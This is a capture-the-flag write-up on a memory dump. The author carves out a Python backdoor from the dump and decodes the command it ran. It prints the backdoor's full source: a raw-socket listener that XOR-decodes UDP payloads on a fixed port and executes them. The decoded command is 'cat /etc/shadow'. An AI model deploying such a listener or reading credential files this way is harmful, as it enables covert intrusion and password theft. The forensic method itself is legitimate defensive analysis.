# Volatile Incident Writeup

## Initial Analysis
We were provided with a memory dump `dump.zip` which extracts to a 3GB `dump.mem` file, and a description asking what the backdoor was executing.

I initially tried to use `volatility3` to analyze the memory dump, but it failed because it couldn't find the necessary profiles/symbols for the Linux kernel version.

## Finding the Backdoor
Since I couldn't use standard memory forensics tools, I fell back to using `strings` on the memory dump. Knowing the flag format was `SK-CERT{}`, I searched for this format directly:
```bash
strings -a dump.mem | grep -o -E "SK-CERT\{.*\}" | sort | uniq
```

This revealed two strings:
1. `SK-CERT{4....................g}`
2. `SK-CERT{5ymb0l5_4r3_imp0r74n7}`

To investigate further, I looked for surrounding context for `SK-CERT{5ymb0l5_4r3_imp0r74n7}`:
```bash
strings -a dump.mem | grep -B 10 -A 10 "5ymb0l5_4r3_imp0r74n7"
```
This showed that the string was typed into the user's `.bash_history` alongside `ls` commands.

I also searched for python scripts running in the background, knowing it was likely a script since it was a backdoor:
```bash
strings -a dump.mem | grep "nohup python3"
```
This revealed a command `nohup python3 .bash &`.

I then wrote a python script to search the memory dump for the contents of this `.bash` file by looking for surrounding context in memory around `nohup python3 .bash`.
```python
import re
with open("dump.mem", "rb") as f:
    data = f.read()

matches = re.finditer(b"nohup python3 \.bash", data)
# Extract surrounding context for each match...
```

One of the matches contained the source code for `.bash`:
```python
import socket, struct, os

P, K = 47291, "5fg6r48v3aes5"
F = bytes([102, 45, 74, 117, 55, 102, 108, 13, 67, 24, 82, 27, 5, 91, 57, 4, 2, 0, 66, 9, 24, 84, 62, 84, 70, 106, 1, 10, 82, 6, 45, 7, 12, 67, 74, 28])

def stealth_executor():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    while True:
        f, _ = s.recvfrom(65535)
        p = f[14:]
        if len(p) < 20 or (p[0] >> 4) != 4 or p[9] != 17: continue
        hl = (p[0] & 0x0F) * 4
        h = struct.unpack('!HHHH', p[hl:hl+8])
        if h[1] == P:
            d = p[hl+8 : hl+h[2]]
            c = "".join(chr(d[i] ^ ord(K[i % len(K)])) for i in range(len(d))).strip()
            os.popen(c)

if __name__ == "__main__":
    stealth_executor()
```

## Extracting the Executed Command
The backdoor code creates a raw socket, listens for UDP packets (protocol 17) destined to port `47291` (`P`), extracts the payload, decrypts it using XOR with the key `5fg6r48v3aes5` (`K`), and then executes the decrypted payload using `os.popen(c)`.

I wrote a python script to scan the entire 3GB memory dump for the raw UDP packets destined to port 47291:
```python
import re
import struct

with open("dump.mem", "rb") as f:
    data = f.read()

K = b"5fg6r48v3aes5"
port_bytes = struct.pack("!H", 47291)

# Search for the destination port bytes in the memory
matches = re.finditer(port_bytes, data)
for m in matches:
    start = m.start()
    if start < 2: continue

    try:
        length = struct.unpack("!H", data[start+2 : start+4])[0]
        if length >= 8 and length < 1000:
            payload_len = length - 8
            payload = data[start+6 : start+6+payload_len]
            if len(payload) == payload_len:
                # Decrypt the payload
                c = ""
                for i in range(len(payload)):
                    c += chr(payload[i] ^ K[i % len(K)])

                # Check if it looks like printable ASCII
                if all(32 <= ord(char) <= 126 or ord(char) in (9, 10, 13) for char in c):
                    if len(c.strip()) > 0:
                        print(f"Found at {start}: {repr(c)}")
    except Exception:
        pass
```

Running this script produced the following output:
```
Found at 437831664: 'cat /etc/shadow #SK-CERT{4n0th3r_w4y_0f_c4rv1ng}'
Found at 877663500: '5fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes55fg6r48v3aes5'
Found at 2048237079: '5ig2'
Found at 2623801328: 'cat /etc/shadow #SK-CERT{4n0th3r_w4y_0f_c4rv1ng}'
Found at 2800442288: 'cat /etc/shadow #SK-CERT{4n0th3r_w4y_0f_c4rv1ng}'
```

The backdoor was executing `cat /etc/shadow`, and the command contained the flag in a comment!

**Flag:** `SK-CERT{4n0th3r_w4y_0f_c4rv1ng}`
